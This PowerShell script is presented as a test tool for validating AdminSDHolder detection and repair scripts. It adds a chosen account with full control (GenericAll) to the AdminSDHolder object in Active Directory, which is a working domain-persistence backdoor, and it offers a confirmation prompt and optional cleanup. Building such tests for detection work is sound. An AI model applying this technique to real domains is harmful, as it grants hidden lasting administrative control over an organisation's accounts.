<#
.SYNOPSIS
    Creates a TEMPORARY test backdoor on AdminSDHolder for validation purposes.

.DESCRIPTION
    This script is a Proof of Concept (PoC) tool designed to validate that the 
    Get-AdminSDHolderACL.ps1 and Repair-AdminSDHolderACL.ps1 detection and remediation 
    scripts are working correctly.
    
    It adds a specified test account with GenericAll rights on the AdminSDHolder object,
    simulating a real-world persistence technique. 
    
    [!] This script requires Domain Admin privileges.
    [!] Always run Repair-AdminSDHolderACL.ps1 immediately after testing.

.PARAMETER TestAccount
    The SamAccountName of the account to use as a simulated backdoor (e.g., "testuser").

.PARAMETER Cleanup
    Switch to immediately remove the test backdoor after creation (auto-cleanup mode).

.EXAMPLE
    .\Test-AdminSDHolderBackdoor.ps1 -TestAccount "fferman"
    Adds fferman with GenericAll on AdminSDHolder.

.EXAMPLE
    .\Test-AdminSDHolderBackdoor.ps1 -TestAccount "fferman" -Cleanup
    Adds the backdoor, pauses for you to run detection, then removes it automatically.

.AUTHOR
    Frank Ferman
#>

param (
    [Parameter(Mandatory=$true)]
    [string]$TestAccount,
    
    [switch]$Cleanup
)

Import-Module ActiveDirectory

Write-Host "==========================================================" -ForegroundColor Cyan
Write-Host " AdminSDHolder Backdoor PoC (Test & Validation Tool)" -ForegroundColor Cyan
Write-Host "==========================================================" -ForegroundColor Cyan

# 1. Resolve the test account
Write-Host "`n[*] Resolving test account: $TestAccount... " -NoNewline
try {
    $User = Get-ADUser -Identity $TestAccount -ErrorAction Stop
    Write-Host "Found ($($User.Name))." -ForegroundColor Green
} catch {
    Write-Host "NOT FOUND." -ForegroundColor Red
    Write-Host "[!] The account '$TestAccount' does not exist in Active Directory." -ForegroundColor Red
    Exit
}

# 2. Get AdminSDHolder DN
$Domain = Get-ADDomain
$AdminSDHolderDN = "CN=AdminSDHolder,CN=System,$($Domain.DistinguishedName)"
Write-Host "[*] Target: $AdminSDHolderDN" -ForegroundColor Yellow

# 3. Safety confirmation
Write-Host "`n[!] WARNING: This will add '$($User.Name)' with FULL CONTROL (GenericAll)" -ForegroundColor Red
Write-Host "[!] on the AdminSDHolder object. This simulates a real backdoor." -ForegroundColor Red
$Confirm = Read-Host "Proceed? (Y/N)"

if ($Confirm -notmatch "^[Yy]$") {
    Write-Host "[-] Cancelled." -ForegroundColor Yellow
    Exit
}

# 4. Add the test ACL entry
Write-Host "`n[*] Adding GenericAll ACE for '$($User.Name)'... " -NoNewline
try {
    $ADObject = [ADSI]"LDAP://$AdminSDHolderDN"
    $ACL = $ADObject.ObjectSecurity
    
    # Build the Access Rule: Allow GenericAll for the test user's SID
    $SID = New-Object System.Security.Principal.SecurityIdentifier($User.SID)
    $AccessRule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
        $SID,
        [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
        [System.Security.AccessControl.AccessControlType]::Allow
    )
    
    $ACL.AddAccessRule($AccessRule)
    $ADObject.CommitChanges()
    Write-Host "SUCCESS." -ForegroundColor Green
    
    Write-Host "`n[+] BACKDOOR SIMULATED:" -ForegroundColor Red
    Write-Host "    Account : $($User.Name) ($TestAccount)" -ForegroundColor Red
    Write-Host "    SID     : $($User.SID)" -ForegroundColor Red
    Write-Host "    Rights  : GenericAll (Full Control)" -ForegroundColor Red
    Write-Host "    Target  : AdminSDHolder" -ForegroundColor Red
} catch {
    Write-Host "FAILED ($($_.Exception.Message))" -ForegroundColor Red
    Exit
}

# 5. Cleanup mode
if ($Cleanup) {
    Write-Host "`n[*] -Cleanup mode enabled." -ForegroundColor Yellow
    Write-Host "[*] Run your detection scripts now (Get-AdminSDHolderACL.ps1)." -ForegroundColor Yellow
    Read-Host "Press ENTER when ready to remove the test backdoor"
    
    Write-Host "[*] Removing test ACL entry... " -NoNewline
    try {
        $ADObject = [ADSI]"LDAP://$AdminSDHolderDN"
        $ACL = $ADObject.ObjectSecurity
        $ACL.RemoveAccessRule($AccessRule) | Out-Null
        $ADObject.CommitChanges()
        Write-Host "REMOVED." -ForegroundColor Green
        Write-Host "[+] AdminSDHolder is clean again." -ForegroundColor Green
    } catch {
        Write-Host "FAILED ($($_.Exception.Message))" -ForegroundColor Red
        Write-Host "[!] Run Repair-AdminSDHolderACL.ps1 -Remediate to force cleanup." -ForegroundColor Red
    }
} else {
    Write-Host "`n[i] Don't forget to run Repair-AdminSDHolderACL.ps1 -Remediate to clean up!" -ForegroundColor Yellow
}
